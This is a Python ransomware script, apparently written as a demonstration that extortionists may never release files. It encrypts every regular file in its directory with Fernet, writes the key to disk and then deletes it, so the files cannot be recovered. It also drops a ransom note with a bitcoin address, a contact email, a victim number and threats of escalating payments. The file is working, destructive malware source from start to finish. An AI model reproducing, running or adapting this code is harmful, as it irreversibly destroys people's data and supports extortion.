#!/usr/bin/env python3
#This is a ransomware without the decryption key and it is to demonstrate some hackers will collect payment without any intention of releasing the locked file.
import os
from cryptography.fernet import Fernet

dir_files = []
for file in os.listdir():
        if file == "ransomware.py" or file == "payment_instructions":
                continue
        if os.path.isfile(file):
                dir_files.append(file)

print (dir_files)

payment = open("payment_instructions", "w")

payment.write('''Send the bitcoin payment to this address: 14qViLJfdGaP4EeHnDyJbEGQysnCpwk3gd.
 
Then send an email to recovermyfiles@proton.me. With Email Subject +++ victim 0101 Paid +++.
 
If after 72hrs we do not hear from you, 3BTC would be added for the next 7days after which we would delete the key and your files are lost forever.
 
WARNING: Do not attempt to 1) Decrypt it yourself as it is a waste of your time 2) Change the original file name as it makes the files unrecoverable 3) Sending paid without actually paying as it would incure an additional 2.5BTC''')

payment.close()

encryption_key = Fernet.generate_key()
with open("lock.key", "wb") as lock_key:
        lock_key.write(encryption_key)

for file in dir_files:
        with open(file, "rb") as files_to_encrypt:
                directory_contents = files_to_encrypt.read()
        encrypted_contents = Fernet(encryption_key).encrypt(directory_contents)
        with open (file, "wb") as encrypted_files:
                encrypted_files.write(encrypted_contents)

print ('''

ATTENTION!!!.. All your files has been encrypted by our Ransomware. You are victim 0101. Read the payment_instructions file for more details....ATTENTION!!!

''')
filepath = "/home/parrot/Esu/Malware/lock.key" #Replace with actual file and directory where the ransomware program resides

try:
	os.remove(filepath)

except FileNotFoundError:

	print (f"File '{filepath}' not found.")
